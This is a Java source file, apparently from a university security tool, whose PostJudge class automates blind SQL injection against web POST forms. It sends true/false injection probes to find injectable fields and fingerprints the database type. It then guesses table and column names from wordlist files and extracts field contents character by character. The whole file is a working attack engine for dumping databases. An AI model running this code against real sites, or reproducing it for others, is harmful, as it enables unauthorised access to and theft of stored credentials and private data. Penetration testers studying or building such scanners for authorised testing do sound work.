package cn.edu.neu.MJ.SQLInject;

import cn.edu.neu.HJ.ProcedureOrientedJAVA.TheParam;
import cn.edu.neu.PublicClass.FormInfo;
import cn.edu.neu.PublicClass.Parser;
import cn.edu.neu.PublicClass.SelectValue;
import cn.edu.neu.PublicClass.WebTools;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import static cn.edu.neu.HJ.GUI.GUIStart.mf;


public class PostJudge {

	private String url;
	private ArrayList<String> uau;
	//private int option;//0绕过 1暴力 2注入
	private ArrayList<FormInfo> fiList = new ArrayList<FormInfo>();
	private int index;
	private String n_name = null;//用户名的name
	private String p_name = null;//口令的name
	private WebInfo wi = new WebInfo();
	private ArrayList<String> list1;
	
	//private JTextArea jta;
	//private JScrollPane jsp;
	
	//public myPostMethod(String url,ArrayList<FormInfo> fiList,int index,String n_name,String p_name){
	public PostJudge(String url){	
		this.url = url;
		//this.uau = uau;
		//this.option = option;
		//this.jta = jta;
		//this.jsp = jsp;
		//System.out.println("111111111111");
		Parser p = new Parser();
		try {
			p.start(url);
		} catch (IOException e) {
			e.printStackTrace();
		}
		fiList = p.getFIList();
		if(p.u_NameNum()==0 && (p.getN_name()==null || p.getP_name()==null)){
			wi.setSii(new SqlInjectInfo());
			wi.getSii().setPost(false);
			wi.getSii().setCheck(true);
			return;
		}
		this.index = p.getIndex();
		this.n_name = p.getN_name();
		this.p_name = p.getP_name();
		test();
	}
	public void test(){
		WebTools wts = new WebTools();
		ArrayList<String> list2;
		ArrayList<String> list3;
		ArrayList<String> list4;
		ArrayList<String> list5;
		ArrayList<String> list6;
		ArrayList<String> list7;
		ArrayList<String> content = new ArrayList<String>();
		ArrayList<String> content1 = new ArrayList<String>();
		ArrayList<String> content2 = new ArrayList<String>();
		ArrayList<String> content3 = new ArrayList<String>();
		ArrayList<String> content4 = new ArrayList<String>();
		ArrayList<String> content5 = new ArrayList<String>();
		ArrayList<String> content6 = new ArrayList<String>();
		content.add("1");//%' and '1%'='2
		content1.add("1%' and '1%'='1");//1% and 1% = 1
		content2.add("1%' and '1%'='2");
		content3.add("1 and 1=1");
		content4.add("1 and 1=2");
		content5.add("1' and '1'='1");
		content6.add("1' and '1'='2");
		int canpost = -1;
		String sqltype = "";
		//System.out.println("fiList.size()="+fiList.size());
		for (int i=0;i<fiList.size();i++){
			if (fiList.get(i).method == null || !fiList.get(i).method.toLowerCase().equals("post")){
				continue;
			}
				
			list1 = myPost(i,fiList,content);
			list2 = myPost(i,fiList,content1);
			list3 = myPost(i,fiList,content2);
			list4 = myPost(i,fiList,content3);
			list5 = myPost(i,fiList,content4);
			list6 = myPost(i,fiList,content5);
			list7 = myPost(i,fiList,content6);
			
			if (wts.Compare(list1, list2) && !wts.Compare(list1, list3)){
				canpost = i;
				sqltype = "searchPost";
				mf.printSQLInjectProcess("存在Post注入" + "\n");
				mf.printSQLInjectProcess("注入类型：searchPost" + "\n");
				mf.printSQLInjectTypeResult("搜索型post注入\n");
                TheParam.getParams().sqlInjectType.add("searchPost");
                TheParam.getParams().isSQL = true;
				System.out.println("注入类型：searchPost");
				break;
			}
			if (wts.Compare(list1, list4) && !wts.Compare(list1, list5)){
				canpost = i;
				sqltype = "intPost";
				mf.printSQLInjectProcess("存在Post注入" + "\n");
				mf.printSQLInjectProcess("注入类型：intPost" + "\n");
				mf.printSQLInjectTypeResult("整型post注入\n");
				System.out.println("注入类型：intPost");
                TheParam.getParams().sqlInjectType.add("intPost");
                TheParam.getParams().isSQL = true;
				break;
			}
			if (wts.Compare(list1, list6) && !wts.Compare(list1, list7)){
				canpost = i;
				sqltype = "charPost";
				mf.printSQLInjectProcess("存在Post注入" + "\n");
				mf.printSQLInjectProcess("注入类型：charPost" + "\n");
				System.out.println("注入类型：charPost");
				mf.printSQLInjectTypeResult("字符型post注入\n");
                TheParam.getParams().sqlInjectType.add("charhPost");
                TheParam.getParams().isSQL = true;
				break;
			}
		}
		
		if (canpost != -1){
			System.out.println("存在Post注入");
			wi.setSii(new SqlInjectInfo());
			wi.getSii().setPost(true);
			String dbtype = dbType(canpost,sqltype);
			System.out.println("数据库类型为："+dbtype);
			mf.printSQLInjectProcess("数据库类型为：" + dbtype + "\n");
			mf.setDataBaseType(dbtype);
            TheParam.getParams().sqlDatabaseTpye = dbtype;

			wi.getSii().setDbtype(dbtype);}
			ArrayList<String> tablename = getTN(canpost,sqltype);
			if (tablename.size() == 0){
				System.out.println("猜解不到表名");
				mf.printSQLInjectProcess("猜解不到表名\n");
				return;
			}
			
			System.out.println("下面检测字段名：");
		    mf.printSQLInjectProcess("下面检测字段名：\n");
			for (int i=0;i<tablename.size();i++){
				TableInfo ti = new TableInfo();
				ti.setTablename(tablename.get(i));
				String tn = tablename.get(i);
				int t = i+1;
				System.out.println("第"+t+"个表"+tn+"存在以下字段：");
				mf.printSQLInjectProcess("第" + t + "个表" + tn + "存在以下字段：\n");
				mf.setWordNameResult("第" + t + "个表" + tn + "存在以下字段：\n");
				mf.setSQLWordResult(tn+"表\n");
				ArrayList<String> fieldname = getFN(tn, canpost, sqltype);
				for (int j=0;j<fieldname.size();j++){
					System.out.println(fieldname.get(j));
					mf.printSQLInjectProcess(fieldname.get(j));
					mf.setWordNameResult(fieldname.get(j) + "\n");
				}
				String idword = "";
				for (int j=0;j<fieldname.size();j++)
					if (fieldname.get(j).equals("id")){
						idword = "id";
						break;
					}
				if (idword.equals(""))
					for (int j=0;j<fieldname.size();j++)
						if (fieldname.get(j).indexOf("id")!=-1){
							idword = new String(fieldname.get(j));
							break;
						}
				int[] id;
				if (!idword.equals("")){
					id = guessID(tn, idword, canpost, sqltype);
					System.out.println("id:::::::");
					mf.printSQLInjectProcess("猜解可用id：");
					for (int j=0;j<id.length;j++)
						System.out.println(id[j]);
					for (int j = 0; j < id.length; j++) {
						mf.printSQLInjectProcess("id["+j+"]="+id[j]);
						System.out.println("id["+j+"]="+id[j]);
				    }
					ti.getFieldname().add(idword);
				    for (int j = 0; j < id.length; j++)
				    	ti.getContent().add(String.valueOf(id[j]));

				}
				else{
					idword="1";
					id = null;
				}
				//System.out.println("字段名");
				List<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
				/*for (int j=0;j<fieldname.size();j++)
					System.out.println(fieldname.get(j));*/
				for (int j=0;j<fieldname.size();j++){
					if(fieldname.get(j).equals(idword)){
						j++;
						if(j==fieldname.size())
							break;
					}
					mf.printSQLInjectProcess("字段" + fieldname.get(j) + "的内容：\n");
					System.out.println(fieldname.get(j) + "的内容：");
					mf.setSQLWordResult(fieldname.get(j) + "字段的内容：\n");
					String dbtype = dbType(canpost,sqltype);
					ArrayList<String> contentlist = guessContent(tn, fieldname.get(j), id, idword, dbtype, canpost, sqltype);
					list.add(contentlist);
					for (int k=0;k<contentlist.size();k++){
						System.out.println(contentlist.get(k));
						mf.printSQLInjectProcess(contentlist.get(k) + "\n");
						mf.setSQLWordResult(contentlist.get(k) + "\n");
					}
				}
				for (int j=0;j<fieldname.size();j++){
	            	if (!fieldname.get(j).equals(idword))
	            		ti.getFieldname().add(fieldname.get(j));
	            	}
	            for (int k=0;k<list.size();k++){
	            	for (int j=0;j<list.get(k).size();j++){
	            		ti.getContent().add(list.get(k).get(j));
	            	}
	            	}
	            wi.getSii().getTiList().add(ti);
				mf.setSQLWordResult("\n");
			}	
			//System.out.println("存在Post注入");
			System.out.println("Post Over");
            TheParam.getParams().sqlInjectInfo = wi.getSii();

		}/*else{
			wi.setSii(new SqlInjectInfo());
			wi.getSii().setPost(false);
			System.out.println("不存在Post注入");
			System.out.println("Post Over");
		}*/



	
	
	private ArrayList<String> myPost(int index,ArrayList<FormInfo> fiList,ArrayList<String> content){
		ArrayList<String> ret=new ArrayList<String>();
		try {
			String newurl = null;
			if (fiList.get(index).action!=null){
				newurl = this.url.substring(0,this.url.lastIndexOf("/")+1);
				newurl += fiList.get(index).action;	
				//action 属性规定当提交表单时，向何处发送表单数据
			}else
				newurl = this.url;
			URL url = new URL(newurl);
			//System.out.println(url);
			//mf.printSQLInjectProcess(url + "\n");
		URLConnection connection = url.openConnection();
		StringBuffer formDataItems = new StringBuffer(); 
		String charset = new WebTools().charSet(url);
		ArrayList <String> name = fiList.get(index).u_Name;
		ArrayList <String> s_name = fiList.get(index).s_Name;
		ArrayList <SelectValue> s_value = fiList.get(index).s_value;
		for (int i=0;i<name.size();i++){
			if (i>0)
			formDataItems.append("&");
			formDataItems.append(name.get(i)); 
			formDataItems.append("=");  
			formDataItems.append(URLEncoder.encode(content.get(i) == null ? "s" : content.get(i), charset));
			//System.out.println(formDataItems);


		}
		for (int i=0;i<s_name.size();i++){
			formDataItems.append("&");
			formDataItems.append(s_name.get(i)); 
			formDataItems.append("="); 
			formDataItems.append(URLEncoder.encode(s_value.get(0).v.get(0), charset));
			//System.out.println(formDataItems);
			mf.printSQLInjectProcess(formDataItems+ "\n");
		}
		connection.setDoOutput(true);
		//setDoOutput(boolean dooutput)将此 URLConnection 的 doOutput 字段的值设置为指定的值。 
		//URL 连接可用于输入和/或输出。如果打算使用 URL 连接进行输出，则将 DoOutput 标志设置为 true；如果不打算使用，则设置为 false。默认值为 false。 
	
		OutputStreamWriter out = new OutputStreamWriter(connection.getOutputStream(), charset);
		//getOutputStream()返回写入到此连接的输出流。
		out.write(new String(formDataItems));
		out.flush(); //先刷新    
	    out.close(); //再关流
	    
	    String sCurrentLine;     
	    sCurrentLine = "";     
	    InputStream l_urlStream;     
	    l_urlStream = connection.getInputStream(); //返回从此打开的连接读取的输入流   
	    // 传说中的三层包装阿！     
	    BufferedReader l_reader = new BufferedReader(new InputStreamReader(     
	            l_urlStream));     
	    connection.connect();//打开到此 URL 引用的资源的通信链接
	    while ((sCurrentLine = l_reader.readLine()) != null) { 
	    	ret.add(sCurrentLine);
	    }     	
		} catch (IOException e){
		//System.out.println("500 for URL");
		} catch (Exception e) { 
		e.printStackTrace(); 
		} 
		//System.out.println(ret);
		return ret;
		}
	public String dbType(int canpost,String sqltype){
		String head,tail;
		if (sqltype.equals("searchPost")){
			head = "1%' and ";
			tail = " and '1%'='1";
		}else if(sqltype.equals("intPost"))
		{
			head = "1 and ";
			tail = "and 1=1";
		}else{
			head = "1' and ";
			tail = "and '1'='1";
		}
		
		ArrayList<String> list2;
		ArrayList<String> content = new ArrayList<String>();
		WebTools wts = new WebTools();
		
		content.add(head+"exists(select * from v$version)"+tail);
		list2 = myPost(canpost,fiList,content);
		if (wts.Compare(list1, list2))
			return "Oracle";
		
		content.set(0, head+"exists(select version())"+tail);
		list2 = myPost(canpost,fiList,content);
		if (wts.Compare(list1, list2))
			return "Mysql";
		
		content.set(0, head+"exists(Select @@Version)"+tail);
		list2 = myPost(canpost,fiList,content);
		if (wts.Compare(list1, list2))
			return "Sqlserver";
		
		content.set(0, head+"exists(select * from MSysAccessObjects)"+tail);
		list2 = myPost(canpost,fiList,content);
		if (wts.Compare(list1, list2))
			return "Access";
		
		return "other";
	}
	
	public ArrayList<String> getTN(int canpost,String sqltype){
		//ArrayList<String> re = new ArrayList<String>();
		ArrayList<String> tnList = new ArrayList<String>();
		String head,tail;
		if (sqltype.equals("searchPost")){
			head = "1%' and ";
			tail = " and '1%'='1";
		}else if(sqltype.equals("intPost"))
		{
			head = "1 and ";
			tail = "and 1=1";
		}else{
			head = "1' and ";
			tail = "and '1'='1";
		}
		
		ArrayList<String> list2;
		ArrayList<String> content = new ArrayList<String>();
		content.add(" ");
		WebTools wts = new WebTools();
		
		System.out.println("下面检测表名：");
		mf.printSQLInjectProcess("下面检测表名：\n");
		File file1=new File("Table.txt");
		BufferedReader bw1 = null;
		try {
			bw1 = new BufferedReader(new FileReader(file1));
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
    	String str1 = null;
		try {
			str1 = bw1.readLine();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		while(str1!=null)
	    {
			content.set(0,head+"exists(select * from "+str1+")"+tail);
			list2 = myPost(canpost,fiList,content);
    		if (wts.Compare(list1, list2)){
    			
    			//System.out.println("存在"+str1+"表");
				mf.printSQLInjectProcess("存在" + str1 + "表\n");
    			tnList.add(str1);	
	    	}
	    	try {
				str1 =bw1.readLine();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			//System.out.println(str1);
	    }
    	try {
			bw1.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
    	for (int i=0;i<tnList.size();i++){
    		System.out.println("猜解出表名：" + tnList.get(i));
			mf.printSQLInjectProcess("猜解出表名：" + tnList.get(i) + "\n");
			mf.setSQLInjectTabelNameResult(tnList.get(i)+"\n");
    	}

        //TheParam.getParams().sqlInjectTable = tnList;
		return tnList;
	}
	
	public ArrayList<String> getFN(String tablename,int canpost,String sqltype){
		
		ArrayList<String> re = new ArrayList<String>();
		String head,tail;
		if (sqltype.equals("searchPost")){
			head = "1%' and ";
			tail = " and '1%'='1";
		}else if(sqltype.equals("intPost"))
		{
			head = "1 and ";
			tail = "and 1=1";
		}else{
			head = "1' and ";
			tail = "and '1'='1";
		}
		
		ArrayList<String> list2;
		ArrayList<String> content = new ArrayList<String>();
		content.add(" ");
		WebTools wts = new WebTools();
		
		File file2 =new File("wordname.txt");
		BufferedReader bw2 = null;
		try {
			bw2 = new BufferedReader(new FileReader(file2));
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		String str2 = null;
		try {
			str2 = bw2.readLine();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		while(str2!=null)
		{
			content.set(0,head+"exists(select "+str2+" from "+tablename+")"+tail);
			list2 = myPost(canpost,fiList,content);
		if (wts.Compare(list1, list2)){
			
			//System.out.println("表"+tablename+"中存在"+str2+"字段");
			mf.printSQLInjectProcess("表" + tablename + "中存在" + str2 + "字段\n");
			//mf.setSQLWordResult("表" + tablename + "中存在" + str2 + "字段\n");
    		re.add(str2);	
    		}
    	try {
			str2 =bw2.readLine();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	}
    	try {
			bw2.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
     return  re;
	}
	
	public int[] guessID(String tablename,String fieldname,int canpost,String sqltype){
		String head,tail;
		if (sqltype.equals("searchPost")){
			head = "1%' and ";
			tail = " and '1%'='1";
		}else if(sqltype.equals("intPost"))
		{
			head = "1 and ";
			tail = "and 1=1";
		}else{
			head = "1' and ";
			tail = "and '1'='1";
		}
		
		
		ArrayList<String> list2;
		ArrayList<String> content = new ArrayList<String>();
		content.add(" ");
		WebTools wts = new WebTools();
		
		int idnum=-1;
		while (true){
			idnum++;
			content.set(0,head+"((select count("+fieldname+") from "+tablename+")="+idnum+")"+tail);
			list2 = myPost(canpost,fiList,content);
			if (wts.Compare(list1, list2))
				break;
		}
		
		int[] re =new int[idnum];
		int i=-1;
		int j=-1;
		while (i<idnum-1){
			i++;
			while (true){
				j++;
				content.set(0,head+"exists(select "+fieldname+" from "+tablename+" where "+fieldname+"="+j+")"+tail);
				list2 = myPost(canpost,fiList,content);
				if (wts.Compare(list1, list2))
					break;
			}
			re[i]=j;
		}
		return re;
	}
	
	public ArrayList<String> guessContent(String tablename,String fieldname,int[] id,String idword,String dbtype,int canpost,String sqltype){
		ArrayList<String> re = new ArrayList<String>();
		
		String head,tail;
		if (sqltype.equals("searchPost")){
			head = "1%' and ";
			tail = " and '1%'='1";
		}else if(sqltype.equals("intPost"))
		{
			head = "1 and ";
			tail = "and 1=1";
		}else{
			head = "1' and ";
			tail = "and '1'='1";
		}
		
		ArrayList<String> list2;
		ArrayList<String> content = new ArrayList<String>();
		content.add(" ");
		WebTools wts = new WebTools();
		
		String lenstr = "len";
		if (dbtype.equals("Oracle"))
			lenstr = "length";
		int l;
		if (id!=null)
			l = id.length;
		else{
			l=-1;
			while (true){
				l++;
				content.set(0,head+"((select count("+fieldname+") from "+tablename+")="+l+")"+tail);
				list2 = myPost(canpost,fiList,content);
				if (wts.Compare(list1, list2))
					break;
			}
		}
		int[] length = new int[l];
		
//		System.out.println("!@#!@#!@#!@#!@#!@#");
		for (int i=0;i<l;i++){
			int temp = 0;
			while (temp<17){
				if (id!=null)
					content.set(0,head+"exists(select "+fieldname+" from "+tablename+" where "+idword+"="+id[i]+" and "+lenstr+"("+fieldname+")="+temp+")"+tail);
				else
					content.set(0,head+"exists(select "+fieldname+" from "+tablename+" where "+idword+"=1 and "+lenstr+"("+fieldname+")="+temp+")"+tail);
//				System.out.println(content.get(0));
				list2 = myPost(canpost,fiList,content);
				if (wts.Compare(list1, list2)){
					//System.out.println("id="+id[i]+":  "+temp);
					length[i] = temp;
					break;
				}
				temp++;
			}
			if (temp == 17)
				length[i] = 0;
		}
//		System.out.println("I'm here!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!11");
		String str;
		int k=0;
		for (int i=0;i<l;i++){
			str = "";
			for (int j=1;j<=length[i];j++){
				for (k=48;k<=(int)'z';k++){
					if (id!=null)
						content.set(0,head+"exists(select "+fieldname+" from "+tablename+" where "+idword+"="+id[i]+" and left("+fieldname+","+j+")='"+str+(char)k+"')"+tail);
					else
						content.set(0,head+"exists(select "+fieldname+" from "+tablename+" where "+idword+"=1 and left("+fieldname+","+j+")='"+str+(char)k+"')"+tail);
//					System.out.println(content.get(0));
					list2 = myPost(canpost,fiList,content);
					if (wts.Compare(list1, list2)){
//						System.out.println("第"+j+"位："+(char)k);
						str+=(char)k;
						break;
					}
				}
			}
			if (k==(int)'z'+1)
				str = "null";
			re.add(str);
			//System.out.println(str);
		}
		
		return re;
	}
}

